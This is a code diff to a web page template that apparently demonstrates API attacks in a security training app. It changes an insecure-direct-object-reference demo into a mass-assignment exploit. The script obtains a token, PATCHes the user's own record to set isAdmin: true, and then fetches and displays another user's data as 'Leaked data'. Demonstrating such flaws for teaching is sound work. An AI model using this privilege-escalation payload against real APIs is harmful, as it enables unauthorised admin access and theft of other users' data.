@@ -1,11 +1,12 @@
 {{#section 'head'}}
     <script>
-        window.API_BASE_URL = '/auth/v1';
+        window.API_BASE_URL = '/auth/v2';
     </script>
 
     <script>
 
         const apiBaseUrl = window.API_BASE_URL;
+        let token;
 
         fetch(`${apiBaseUrl}/tokens`, {
             method: 'POST',
@@ -18,14 +19,29 @@
             })
         })
                 .then((response) => response.json())
-                /* Retrieve John DOE's data using Foo BAR's credentials. */
-                .then((data) => fetch(`${apiBaseUrl}/users/johndoe`, {
+                /* Update isAdmin property. */
+                .then((data) => {
+
+                    token = data.token;
+
+                    return fetch(`${apiBaseUrl}/users/${data.userId}`, {
+                        method: 'PATCH',
+                        headers: {
+                            'Authorization': `Bearer ${token}`,
+                            'Content-Type': 'application/json'
+                        },
+                        body: JSON.stringify({
+                            isAdmin: true
+                        })
+                    });
+                })
+                .then(() => fetch(`${apiBaseUrl}/users/johndoe`, {
                     headers: {
-                        'Authorization': `Bearer ${data.token}`
+                        'Authorization': `Bearer ${token}`
                     }
                 }))
-                .then((response) => response.json())
                 /* Display result. */
+                .then((response) => response.json())
                 .then((data) => {
 
                     let outputElement = document.querySelector('#wt-output');
@@ -49,7 +65,7 @@
 
 {{/section}}
 
-<p>Using Foo BAR's credentials to get John DOE's data (note that the user's id is easily guessable but can be brute forced).</p>
+<p>Making Foo BAR admin then using he's credentials to get John DOE's data.</p>
 
 <h2>Leaked data:</h2>
 <div id="wt-output"></div>
